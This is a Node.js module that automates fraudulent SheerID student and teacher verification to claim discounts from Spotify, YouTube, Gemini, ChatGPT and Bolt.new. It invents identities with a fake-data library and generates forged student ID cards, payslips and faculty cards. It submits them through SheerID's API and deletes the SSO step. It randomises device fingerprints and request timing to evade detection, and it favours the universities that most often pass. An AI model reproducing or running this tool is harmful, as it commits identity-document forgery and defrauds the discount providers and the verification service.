const axios = global.axios || require('axios');
const crypto = require('crypto');
const { generateStudentCard, generatePayslip, generateTeacherCard, generateDocumentsParallel, closeBrowser } = require('./generator');
const faker = require('faker');
const PDFDocument = require('pdfkit');
const { UNIVERSITIES, K12_SCHOOLS } = require('./universities-data');

// ============== IMPROVEMENT: Success Rate Tracking ==============
const verificationStats = {
    total: 0,
    success: 0,
    failed: 0,
    byUniversity: {},
    getSuccessRate: function () {
        return this.total > 0 ? ((this.success / this.total) * 100).toFixed(1) : 0;
    },
    recordSuccess: function (universityName) {
        this.total++;
        this.success++;
        if (!this.byUniversity[universityName]) {
            this.byUniversity[universityName] = { total: 0, success: 0 };
        }
        this.byUniversity[universityName].total++;
        this.byUniversity[universityName].success++;
    },
    recordFailure: function (universityName) {
        this.total++;
        this.failed++;
        if (!this.byUniversity[universityName]) {
            this.byUniversity[universityName] = { total: 0, success: 0 };
        }
        this.byUniversity[universityName].total++;
    }
};

// ============== IMPROVEMENT: Better Device Fingerprint ==============
function generateRealisticFingerprint() {
    const components = [
        Date.now().toString(16),
        Math.random().toString(16).substring(2, 10),
        process.platform || 'win32',
        Math.floor(Math.random() * 1000).toString(16)
    ];
    return crypto.createHash('md5').update(components.join('-')).digest('hex');
}

// ============== IMPROVEMENT: Realistic Birth Date (18-25 years old) ==============
function generateRealisticBirthDate() {
    const now = new Date();
    const minAge = 18;
    const maxAge = 25;
    const minYear = now.getFullYear() - maxAge;
    const maxYear = now.getFullYear() - minAge;
    return faker.date.between(`${minYear}-01-01`, `${maxYear}-12-31`).toISOString().split('T')[0];
}

// ============== IMPROVEMENT: Request Delay to Avoid Rate Limiting ==============
const MIN_DELAY = 300;
const MAX_DELAY = 800;

async function randomDelay() {
    const delay = Math.random() * (MAX_DELAY - MIN_DELAY) + MIN_DELAY;
    await new Promise(r => setTimeout(r, delay));
}

// ============== IMPROVEMENT: Retry Logic with Exponential Backoff ==============
async function retryRequest(fn, maxRetries = 3, operationName = 'Request') {
    for (let i = 0; i < maxRetries; i++) {
        try {
            return await fn();
        } catch (error) {
            const isLastAttempt = i === maxRetries - 1;
            if (isLastAttempt) throw error;

            const delay = Math.pow(2, i) * 1000; // 1s, 2s, 4s
            global.emitLog?.(`   ⚠️ ${operationName} failed (attempt ${i + 1}/${maxRetries}), retrying in ${delay / 1000}s...`);
            await new Promise(r => setTimeout(r, delay));
        }
    }
}

// ============== IMPROVEMENT: Weighted University Selection ==============
function selectBestUniversity(preferUSA = true) {
    // Filter USA universities first (higher success rate typically)
    let candidates = preferUSA
        ? UNIVERSITIES.filter(u => u.country === 'USA' && u.domain)
        : UNIVERSITIES.filter(u => u.domain);

    if (candidates.length === 0) {
        candidates = UNIVERSITIES.filter(u => u.domain);
    }

    // Sort by success rate (universities with no data get priority to test them)
    candidates.sort((a, b) => {
        const statsA = verificationStats.byUniversity[a.name];
        const statsB = verificationStats.byUniversity[b.name];

        // No stats = priority (untested)
        if (!statsA && statsB) return -1;
        if (statsA && !statsB) return 1;
        if (!statsA && !statsB) return Math.random() - 0.5; // Random for untested

        // Compare success rates
        const rateA = statsA.total > 0 ? statsA.success / statsA.total : 0;
        const rateB = statsB.total > 0 ? statsB.success / statsB.total : 0;
        return rateB - rateA;
    });

    // Pick from top 5 performers with some randomness
    const topCandidates = candidates.slice(0, Math.min(5, candidates.length));
    return topCandidates[Math.floor(Math.random() * topCandidates.length)];
}

// Export stats for external monitoring
function getVerificationStats() {
    return { ...verificationStats };
}

function getRandomUniversity(country = null) {
    let candidates = UNIVERSITIES;
    if (country) {
        candidates = UNIVERSITIES.filter(u => u.country === country);
    }
    if (candidates.length === 0) return UNIVERSITIES[Math.floor(Math.random() * UNIVERSITIES.length)];
    return candidates[Math.floor(Math.random() * candidates.length)];
}

// ============== LINK STATE CHECKER ==============
const SHEERID_API_URL = 'https://services.sheerid.com/rest/v2';

// Valid states for starting verification
const VALID_START_STATES = [
    'collectStudentPersonalInfo',
    'collectTeacherPersonalInfo',
    'initial'
];

// Error classification for proper recovery
const ERROR_TYPES = {
    INVALID_STEP: 'invalidStep',
    EXPIRED_LINK: 'expiredLink',
    ORGANIZATION_NOT_FOUND: 'organization_not_found',
    RATE_LIMITED: 'rateLimited',
    SSO_REQUIRED: 'ssoRequired'
};

// Check verification link state before submitting
async function checkLinkState(verificationId) {
    try {
        const response = await axios.get(`${SHEERID_API_URL}/verification/${verificationId}`, {
            timeout: 10000
        });

        const data = response.data;
        return {
            isValid: true,
            currentStep: data.currentStep,
            canProceed: VALID_START_STATES.includes(data.currentStep) || data.currentStep === 'sso',
            segment: data.segment,
            errorIds: data.errorIds || [],
            raw: data
        };
    } catch (error) {
        // If 404 or other error, link is invalid/expired
        return {
            isValid: false,
            currentStep: 'unknown',
            canProceed: false,
            error: error.message,
            errorIds: []
        };
    }
}

// Classify error for appropriate recovery action
function classifyError(errorResponse) {
    const errorIds = errorResponse?.errorIds || [];
    const errorMessage = errorResponse?.systemErrorMessage || '';

    if (errorIds.includes('invalidStep')) {
        return {
            type: ERROR_TYPES.INVALID_STEP,
            message: '❌ Link is not in valid state. Link may have expired or is at a different step.',
            recovery: '💡 Solution: Upload a solid color image (black/white) to trigger link expiration, then get a new link.'
        };
    }

    if (errorIds.includes('organization_not_found')) {
        return {
            type: ERROR_TYPES.ORGANIZATION_NOT_FOUND,
            message: '❌ University not found in SheerID system.',
            recovery: '💡 Solution: Try with a different university.'
        };
    }

    if (errorMessage.includes('rate') || errorMessage.includes('limit')) {
        return {
            type: ERROR_TYPES.RATE_LIMITED,
            message: '⚠️ Rate limited - Too many requests.',
            recovery: '💡 Solution: Wait 1-2 minutes and try again.'
        };
    }

    if (errorIds.includes('expiredLink') || errorMessage.includes('expired')) {
        return {
            type: ERROR_TYPES.EXPIRED_LINK,
            message: '❌ Link has expired.',
            recovery: '💡 Solution: Get a new verification link from the registration page.'
        };
    }

    return {
        type: 'unknown',
        message: `❌ Unknown error: ${errorMessage || JSON.stringify(errorIds)}`,
        recovery: '💡 Solution: Try again or get a new link.'
    };
}

// Helper: Convert PNG buffer to PDF buffer
async function pngToPdf(pngBuffer) {
    return new Promise((resolve, reject) => {
        const doc = new PDFDocument({ size: 'A4' });
        const chunks = [];

        doc.on('data', chunk => chunks.push(chunk));
        doc.on('end', () => resolve(Buffer.concat(chunks)));
        doc.on('error', reject);

        // Add PNG image to PDF, centered
        doc.image(pngBuffer, {
            fit: [500, 700],
            align: 'center',
            valign: 'center'
        });

        doc.end();
    });
}

async function verifySheerID(verificationUrl, type = 'spotify') {
    if (type === 'gpt') {
        // ChatGPT uses k12-style verification (PDF+PNG, birthDate, marketConsentValue=false)
        return verifyGPT(verificationUrl);
    } else if (type === 'teacher') {
        // Bolt.new uses teacher verification
        return verifyTeacher(verificationUrl);
    } else if (type === 'youtube') {
        return verifyStudent(verificationUrl, 'YouTube');
    } else if (type === 'gemini') {
        return verifyStudent(verificationUrl, 'Gemini');
    } else {
        // Default: Spotify
        return verifyStudent(verificationUrl, 'Spotify');
    }
}

async function verifyStudent(verificationUrl, serviceType = 'spotify') {
    let university = null;
    try {
        // 1. Parse Verification ID
        const verificationIdMatch = verificationUrl.match(/verificationId=([a-f0-9]+)/i);
        if (!verificationIdMatch) throw new Error('Invalid Verification URL');
        const verificationId = verificationIdMatch[1];

        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog(`🔍 SheerID ${serviceType.toUpperCase()} Student Verification`);
        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog(`📋 Verification ID: ${verificationId}`);

        // 1.5. CHECK LINK STATE BEFORE PROCEEDING
        global.emitLog('🔗 Checking link state...');
        const linkState = await checkLinkState(verificationId);

        if (!linkState.isValid) {
            global.emitLog('❌ Link is invalid or expired!');
            global.emitLog('💡 Solution: Get a new verification link from the registration page.');
            return {
                success: false,
                error: 'Invalid or expired verification link',
                errorType: ERROR_TYPES.EXPIRED_LINK,
                recovery: 'Get a new verification link from the registration page.'
            };
        }

        if (!linkState.canProceed) {
            const errorInfo = classifyError({ errorIds: linkState.errorIds, systemErrorMessage: '' });
            global.emitLog(`❌ Link state: ${linkState.currentStep} - Cannot proceed!`);
            global.emitLog(errorInfo.message);
            global.emitLog(errorInfo.recovery);
            return {
                success: false,
                error: `Invalid link state: ${linkState.currentStep}`,
                errorType: ERROR_TYPES.INVALID_STEP,
                currentStep: linkState.currentStep,
                recovery: errorInfo.recovery
            };
        }

        global.emitLog(`   ✅ Link valid! Current step: ${linkState.currentStep}`);
        global.emitLog(`📊 Current Success Rate: ${verificationStats.getSuccessRate()}% (${verificationStats.success}/${verificationStats.total})`);

        // 2. Generate Fake Identity with IMPROVEMENTS
        global.emitLog('');
        global.emitLog('📝 [Step 1/4] Generating student identity...');
        const firstName = faker.name.firstName();
        const lastName = faker.name.lastName();

        // IMPROVEMENT: Use weighted university selection based on success rate
        university = selectBestUniversity(true);
        const email = faker.internet.email(firstName, lastName, university.domain || 'psu.edu');

        // IMPROVEMENT: Use realistic birth date (18-25 years old)
        const dob = generateRealisticBirthDate();

        global.emitLog(`🎓 Using University: ${university.name} (ID: ${university.sheerId})`);

        const studentInfo = {
            fullName: `${firstName} ${lastName}`,
            dob: dob,
            studentId: Math.floor(Math.random() * 100000000).toString(),
            university: university.name
        };
        global.emitLog(`   ├─ Name: ${firstName} ${lastName}`);
        global.emitLog(`   ├─ Email: ${email}`);
        global.emitLog(`   ├─ Birth Date: ${dob}`);
        global.emitLog(`   └─ Student ID: ${studentInfo.studentId}`);

        // 3. Generate Document (Screenshot from student-card-generator)
        global.emitLog('');
        global.emitLog('🎨 [Step 2/4] Generating Student ID Card...');
        const imageBuffer = await generateStudentCard(studentInfo);
        global.emitLog(`   └─ ✅ PNG generated: ${(imageBuffer.length / 1024).toFixed(2)}KB`);

        // IMPROVEMENT: Add delay before API request
        await randomDelay();

        // 4. Submit Personal Info with RETRY LOGIC
        global.emitLog('');
        global.emitLog('📤 [Step 3/4] Submitting student info to SheerID...');

        // IMPROVEMENT: Use realistic fingerprint
        const deviceFingerprint = generateRealisticFingerprint();

        const step1Response = await retryRequest(async () => {
            return await axios.post(`${SHEERID_API_URL}/verification/${verificationId}/step/collectStudentPersonalInfo`, {
                firstName,
                lastName,
                email,
                birthDate: dob,
                phoneNumber: "",
                organization: {
                    id: university.sheerId,
                    idExtended: String(university.sheerId),
                    name: university.name
                },
                deviceFingerprintHash: deviceFingerprint,
                locale: 'en-US',
                metadata: {
                    verificationId: verificationId,
                    marketConsentValue: false,
                    refererUrl: `https://services.sheerid.com/verify/67c8c14f5f17a83b745e3f82/?verificationId=${verificationId}`,
                    flags: '{"collect-info-step-email-first":"default","doc-upload-considerations":"default","doc-upload-may24":"default","doc-upload-redesign-use-legacy-message-keys":false,"docUpload-assertion-checklist":"default","font-size":"default","include-cvec-field-france-student":"not-labeled-optional"}',
                    submissionOptIn: 'By submitting the personal information above, I acknowledge that my personal information is being collected under the privacy policy of the business from which I am seeking a discount'
                }
            });
        }, 3, 'Submit student info');

        global.emitLog(`   └─ ✅ Step 3 completed: ${step1Response.data.currentStep}`);

        // Skip SSO if needed
        if (step1Response.data.currentStep === 'sso' || step1Response.data.currentStep === 'collectStudentPersonalInfo') {
            global.emitLog('');
            global.emitLog('⏩ Skipping SSO verification...');
            try {
                await randomDelay();
                const ssoResponse = await axios.delete(`${SHEERID_API_URL}/verification/${verificationId}/step/sso`);
                global.emitLog(`   └─ ✅ SSO skipped: ${ssoResponse.data.currentStep}`);
            } catch (e) {
                global.emitLog(`   └─ ⚠️ SSO skip warning: ${e.message}`);
            }
        }

        const result = await handleDocUpload(verificationId, imageBuffer, 'student_card.png');

        // IMPROVEMENT: Track success/failure
        if (result.success) {
            verificationStats.recordSuccess(university.name);
        } else {
            verificationStats.recordFailure(university.name);
        }

        return result;

    } catch (error) {
        // IMPROVEMENT: Track failure
        if (university) {
            verificationStats.recordFailure(university.name);
        }
        console.error(`❌ ${serviceType} Verification failed:`, error.response ? error.response.data : error.message);
        global.emitLog(`❌ Error: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
        return { success: false, error: error.message };
    }
}

async function verifyTeacher(verificationUrl) {
    let university = null;
    try {
        // 1. Parse Verification ID and externalUserId
        const verificationIdMatch = verificationUrl.match(/verificationId=([a-f0-9]+)/i);
        if (!verificationIdMatch) throw new Error('Invalid Verification URL');
        const verificationId = verificationIdMatch[1];

        // Parse externalUserId if present
        const externalUserIdMatch = verificationUrl.match(/externalUserId=([^&]+)/i);
        const externalUserId = externalUserIdMatch ? externalUserIdMatch[1] : String(Math.floor(Math.random() * 9000000 + 1000000));

        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog('🔍 SheerID TEACHER Verification (Bolt.new Style)');
        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog(`📋 Verification ID: ${verificationId}`);

        // 1.5. CHECK LINK STATE BEFORE PROCEEDING
        global.emitLog('🔗 Checking link state...');
        const linkState = await checkLinkState(verificationId);

        if (!linkState.isValid) {
            global.emitLog('❌ Link is invalid or expired!');
            global.emitLog('💡 Solution: Get a new verification link from the registration page.');
            return {
                success: false,
                error: 'Invalid or expired verification link',
                errorType: ERROR_TYPES.EXPIRED_LINK,
                recovery: 'Get a new verification link from the registration page.'
            };
        }

        if (!linkState.canProceed) {
            const errorInfo = classifyError({ errorIds: linkState.errorIds, systemErrorMessage: '' });
            global.emitLog(`❌ Link state: ${linkState.currentStep} - Cannot proceed!`);
            global.emitLog(errorInfo.message);
            global.emitLog(errorInfo.recovery);
            return {
                success: false,
                error: `Invalid link state: ${linkState.currentStep}`,
                errorType: ERROR_TYPES.INVALID_STEP,
                currentStep: linkState.currentStep,
                recovery: errorInfo.recovery
            };
        }

        global.emitLog(`   ✅ Link valid! Current step: ${linkState.currentStep}`);
        global.emitLog(`📊 Current Success Rate: ${verificationStats.getSuccessRate()}% (${verificationStats.success}/${verificationStats.total})`);

        // 2. Generate Fake Identity with IMPROVEMENTS
        global.emitLog('');
        global.emitLog('📝 [Step 1/4] Generating teacher identity...');
        const firstName = faker.name.firstName();
        const lastName = faker.name.lastName();

        // IMPROVEMENT: Use weighted university selection
        university = selectBestUniversity(true);
        const email = faker.internet.email(firstName, lastName, university.domain || 'psu.edu');

        global.emitLog(`🎓 Using University: ${university.name} (ID: ${university.sheerId})`);

        const teacherInfo = {
            fullName: `${firstName} ${lastName}`,
            university: university.name
        };
        global.emitLog(`   ├─ Name: ${firstName} ${lastName}`);
        global.emitLog(`   └─ Email: ${email}`);

        // 3. Generate Document (Payslip from payslip-generator)
        global.emitLog('');
        global.emitLog('🎨 [Step 2/4] Generating Payslip document...');
        const imageBuffer = await generatePayslip(teacherInfo);
        global.emitLog(`   └─ ✅ PNG generated: ${(imageBuffer.length / 1024).toFixed(2)}KB`);

        // IMPROVEMENT: Add delay before API request
        await randomDelay();

        // 4. Submit Personal Info with RETRY LOGIC
        global.emitLog('');
        global.emitLog('📤 [Step 3/4] Submitting teacher info to SheerID...');

        // IMPROVEMENT: Use realistic fingerprint
        const deviceFingerprint = generateRealisticFingerprint();

        const step1Response = await retryRequest(async () => {
            return await axios.post(`${SHEERID_API_URL}/verification/${verificationId}/step/collectTeacherPersonalInfo`, {
                firstName,
                lastName,
                email,
                birthDate: "", // Bolt.new leaves birthDate empty
                phoneNumber: "",
                organization: {
                    id: university.sheerId,
                    idExtended: String(university.sheerId),
                    name: university.name
                },
                deviceFingerprintHash: deviceFingerprint,
                externalUserId: externalUserId,
                locale: 'en-US',
                metadata: {
                    verificationId: verificationId,
                    marketConsentValue: true, // Bolt.new uses true
                    refererUrl: verificationUrl,
                    externalUserId: externalUserId,
                    flags: '{"doc-upload-considerations":"default","doc-upload-may24":"default","doc-upload-redesign-use-legacy-message-keys":false,"docUpload-assertion-checklist":"default","include-cvec-field-france-student":"not-labeled-optional","org-search-overlay":"default","org-selected-display":"default"}',
                    submissionOptIn: 'By submitting the personal information above, I acknowledge that my personal information is being collected under the privacy policy of the business from which I am seeking a discount'
                }
            });
        }, 3, 'Submit teacher info');

        global.emitLog(`   └─ ✅ Step 3 completed: ${step1Response.data.currentStep}`);

        // Skip SSO if needed
        if (step1Response.data.currentStep === 'sso' || step1Response.data.currentStep === 'collectTeacherPersonalInfo') {
            global.emitLog('');
            global.emitLog('⏩ Skipping SSO verification...');
            try {
                await randomDelay();
                const ssoResponse = await axios.delete(`${SHEERID_API_URL}/verification/${verificationId}/step/sso`);
                global.emitLog(`   └─ ✅ SSO skipped: ${ssoResponse.data.currentStep}`);
            } catch (e) {
                global.emitLog(`   └─ ⚠️ SSO skip warning: ${e.message}`);
            }
        }

        // 5. Upload Document (Step 2)
        const uploadResult = await handleDocUpload(verificationId, imageBuffer, 'payslip.png');

        if (uploadResult.success) {
            global.emitLog('');
            global.emitLog('⏳ Polling for reward code...');
            const rewardCode = await pollForRewardCode(verificationId);

            // IMPROVEMENT: Track success
            verificationStats.recordSuccess(university.name);

            if (rewardCode) {
                return { success: true, message: 'Verification successful!', rewardCode: rewardCode };
            } else {
                return { success: true, message: 'Verification submitted. Please check your email for the code.' };
            }
        }

        // IMPROVEMENT: Track failure
        verificationStats.recordFailure(university.name);
        return uploadResult;

    } catch (error) {
        // IMPROVEMENT: Track failure
        if (university) {
            verificationStats.recordFailure(university.name);
        }
        console.error('❌ Teacher Verification failed:', error.response ? error.response.data : error.message);
        global.emitLog(`❌ Error: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
        return { success: false, error: error.message };
    }
}

async function verifyGPT(verificationUrl) {
    try {
        // 1. Parse Verification ID (supports both ?verificationId=... and /verify/...)
        const verificationIdMatch = verificationUrl.match(/(?:verificationId=|verify\/)([a-f0-9]+)/i);
        if (!verificationIdMatch) throw new Error('Invalid Verification URL format. Expected .../verify/{ID} or ...?verificationId={ID}');
        const verificationId = verificationIdMatch[1];

        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog('🔍 SheerID CHATGPT TEACHER Verification (K12 Style)');
        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog(`📋 Verification ID: ${verificationId}`);

        // 1.5. CHECK LINK STATE BEFORE PROCEEDING
        global.emitLog('🔗 Checking link state...');
        const linkState = await checkLinkState(verificationId);

        if (!linkState.isValid) {
            global.emitLog('❌ Link is invalid or expired!');
            global.emitLog('💡 Solution: Get a new verification link from the registration page.');
            return {
                success: false,
                error: 'Invalid or expired verification link',
                errorType: ERROR_TYPES.EXPIRED_LINK,
                recovery: 'Get a new verification link from the registration page.'
            };
        }

        if (!linkState.canProceed) {
            const errorInfo = classifyError({ errorIds: linkState.errorIds, systemErrorMessage: '' });
            global.emitLog(`❌ Link state: ${linkState.currentStep} - Cannot proceed!`);
            global.emitLog(errorInfo.message);
            global.emitLog(errorInfo.recovery);
            return {
                success: false,
                error: `Invalid link state: ${linkState.currentStep}`,
                errorType: ERROR_TYPES.INVALID_STEP,
                currentStep: linkState.currentStep,
                recovery: errorInfo.recovery
            };
        }

        global.emitLog(`   ✅ Link valid! Current step: ${linkState.currentStep}`);

        // 2. Generate Fake Identity with birthDate (required for k12)
        global.emitLog('');
        global.emitLog('📝 [Step 1/5] Generating teacher identity...');

        // Select a random K-12 school
        const school = K12_SCHOOLS[Math.floor(Math.random() * K12_SCHOOLS.length)];
        global.emitLog(`🏫 Using K-12 School: ${school.name} (${school.country})`);

        const firstName = faker.name.firstName();
        const lastName = faker.name.lastName();
        const email = faker.internet.email(firstName, lastName, school.domain);
        const dob = '1985-06-15'; // Teachers are typically older

        const teacherInfo = {
            fullName: `${firstName} ${lastName}`,
            dob: dob,
            employeeId: 'E-' + Math.floor(Math.random() * 9000000 + 1000000)
        };
        global.emitLog(`   ├─ Name: ${firstName} ${lastName}`);
        global.emitLog(`   ├─ Email: ${email}`);
        global.emitLog(`   └─ Birth Date: ${dob}`);

        // 3. Generate Documents (PNG screenshot, then convert to PDF)
        global.emitLog('');
        global.emitLog('🎨 [Step 2/5] Generating Teacher documents...');
        global.emitLog('   ├─ Generating payslip...');
        const payslipPng = await generatePayslip(teacherInfo);
        const pdfBuffer = await pngToPdf(payslipPng);
        global.emitLog(`   ├─ ✅ PDF generated: ${(pdfBuffer.length / 1024).toFixed(2)}KB`);

        // Also generate Faculty ID Card PNG
        global.emitLog('   ├─ Generating Faculty ID Card...');
        const teacherCardPng = await generateTeacherCard(teacherInfo);
        global.emitLog(`   └─ ✅ PNG generated: ${(teacherCardPng.length / 1024).toFixed(2)}KB`);

        // 4. Submit Personal Info (k12-style with birthDate and marketConsentValue=false)
        global.emitLog('');
        global.emitLog('📤 [Step 3/5] Submitting teacher info to SheerID...');
        const step1Response = await axios.post(`${SHEERID_API_URL}/verification/${verificationId}/step/collectTeacherPersonalInfo`, {
            firstName,
            lastName,
            email,
            birthDate: dob, // k12 requires birthDate
            phoneNumber: "",
            organization: {
                id: school.sheerId,
                idExtended: school.idExtended,
                name: school.name
            },
            deviceFingerprintHash: '686f727269626c656861636b',
            locale: 'en-US',
            metadata: {
                verificationId: verificationId,
                marketConsentValue: false, // k12 uses false
                submissionOptIn: 'By submitting the personal information above, I acknowledge that my personal information is being collected under the privacy policy of the business from which I am seeking a discount'
            }
        });

        global.emitLog(`   └─ ✅ Step 3 completed: ${step1Response.data.currentStep}`);

        // Skip SSO if needed
        if (step1Response.data.currentStep === 'sso' || step1Response.data.currentStep === 'collectTeacherPersonalInfo') {
            global.emitLog('');
            global.emitLog('⏩ [Step 4/5] Skipping SSO verification...');
            try {
                const ssoResponse = await axios.delete(`${SHEERID_API_URL}/verification/${verificationId}/step/sso`);
                global.emitLog(`   └─ ✅ SSO skipped: ${ssoResponse.data.currentStep}`);
            } catch (e) {
                global.emitLog(`   └─ ⚠️ SSO skip warning (might be already skipped)`);
            }
        }

        // 5. Upload Documents (PDF + PNG) - k12 style
        global.emitLog('');
        global.emitLog('📤 [Step 5/5] Uploading documents to SheerID...');
        global.emitLog('   ├─ Requesting upload URLs...');
        const docUploadResponse = await axios.post(`${SHEERID_API_URL}/verification/${verificationId}/step/docUpload`, {
            files: [
                {
                    fileName: 'teacher_document.pdf',
                    mimeType: 'application/pdf',
                    fileSize: pdfBuffer.length
                },
                {
                    fileName: 'teacher_document.png',
                    mimeType: 'image/png',
                    fileSize: teacherCardPng.length
                }
            ]
        });

        const documents = docUploadResponse.data.documents || [];
        if (documents.length < 2) throw new Error('Failed to get upload URLs');
        global.emitLog('   ├─ ✅ Upload URLs received');

        // Upload PDF
        global.emitLog('   ├─ Uploading PDF to S3...');
        await axios.put(documents[0].uploadUrl, pdfBuffer, {
            headers: { 'Content-Type': 'application/pdf' }
        });
        global.emitLog('   ├─ ✅ PDF uploaded');

        // Upload PNG
        global.emitLog('   ├─ Uploading PNG to S3...');
        await axios.put(documents[1].uploadUrl, teacherCardPng, {
            headers: { 'Content-Type': 'image/png' }
        });
        global.emitLog('   ├─ ✅ PNG uploaded');

        // Complete upload
        global.emitLog('   ├─ Confirming upload with SheerID...');
        const completeResponse = await axios.post(`${SHEERID_API_URL}/verification/${verificationId}/step/completeDocUpload`);
        global.emitLog(`   └─ ✅ Documents submitted: ${completeResponse.data.currentStep}`);

        global.emitLog('');
        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog('✅ VERIFICATION SUBMITTED SUCCESSFULLY!');
        global.emitLog('═══════════════════════════════════════════════════════════');

        // Poll for reward code
        global.emitLog('');
        global.emitLog('⏳ Polling for reward code...');
        const rewardCode = await pollForRewardCode(verificationId);
        if (rewardCode) {
            global.emitLog(`🎉 Reward Code: ${rewardCode}`);
            return { success: true, message: 'Verification successful!', rewardCode: rewardCode };
        } else {
            global.emitLog('📧 No instant code. Please check your email.');
            return { success: true, message: 'Verification submitted. Please check your email for the code.' };
        }

    } catch (error) {
        console.error('❌ ChatGPT Verification failed:', error.response ? error.response.data : error.message);
        global.emitLog(`❌ Error: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
        return { success: false, error: error.message };
    }
}

async function pollForRewardCode(verificationId, maxAttempts = 10) {
    for (let i = 0; i < maxAttempts; i++) {
        try {
            await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2s
            const response = await axios.get(`${SHEERID_API_URL}/verification/${verificationId}`);
            const data = response.data;

            if (data.rewardCode) return data.rewardCode;
            if (data.rewardData && data.rewardData.rewardCode) return data.rewardData.rewardCode;

            // If status is success but no code yet, keep polling
            if (data.currentStep === 'success') {
                // Sometimes code appears a bit later
            } else if (data.currentStep === 'error' || data.currentStep === 'rejected') {
                return null; // Stop polling on failure
            }

            global.emitLog(`   └─ Attempt ${i + 1}/${maxAttempts}...`);
        } catch (e) {
            console.error('   Polling error:', e.message);
        }
    }
    return null;
}

async function handleDocUpload(verificationId, imageBuffer, fileName) {
    try {
        global.emitLog('');
        global.emitLog('📤 [Step 4/4] Uploading document to SheerID...');

        // Request upload URL
        global.emitLog('   ├─ Requesting upload URL...');
        const docUploadResponse = await axios.post(`${SHEERID_API_URL}/verification/${verificationId}/step/docUpload`, {
            files: [{
                fileName: fileName,
                mimeType: 'image/png',
                fileSize: imageBuffer.length
            }]
        });
        global.emitLog('   ├─ ✅ Upload URL received');

        const uploadUrl = docUploadResponse.data.documents[0].uploadUrl;

        // Upload to S3
        global.emitLog('   ├─ Uploading to S3...');
        await axios.put(uploadUrl, imageBuffer, {
            headers: { 'Content-Type': 'image/png' }
        });
        global.emitLog('   ├─ ✅ Document uploaded to S3');

        // Confirm Upload
        global.emitLog('   ├─ Confirming upload with SheerID...');
        const completeResponse = await axios.post(`${SHEERID_API_URL}/verification/${verificationId}/step/completeDocUpload`);
        global.emitLog(`   └─ ✅ Upload confirmed: ${completeResponse.data.currentStep}`);

        global.emitLog('');
        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog('✅ VERIFICATION SUBMITTED SUCCESSFULLY!');
        global.emitLog('═══════════════════════════════════════════════════════════');
        global.emitLog(`📧 Status: ${completeResponse.data.currentStep}`);
        global.emitLog('Please check your email for confirmation.');

        return {
            success: true,
            status: completeResponse.data.currentStep,
            message: 'Verification submitted successfully. Check email for confirmation.'
        };
    } catch (error) {
        throw error;
    }
}

module.exports = { verifySheerID, getVerificationStats, checkLinkState, classifyError, ERROR_TYPES };
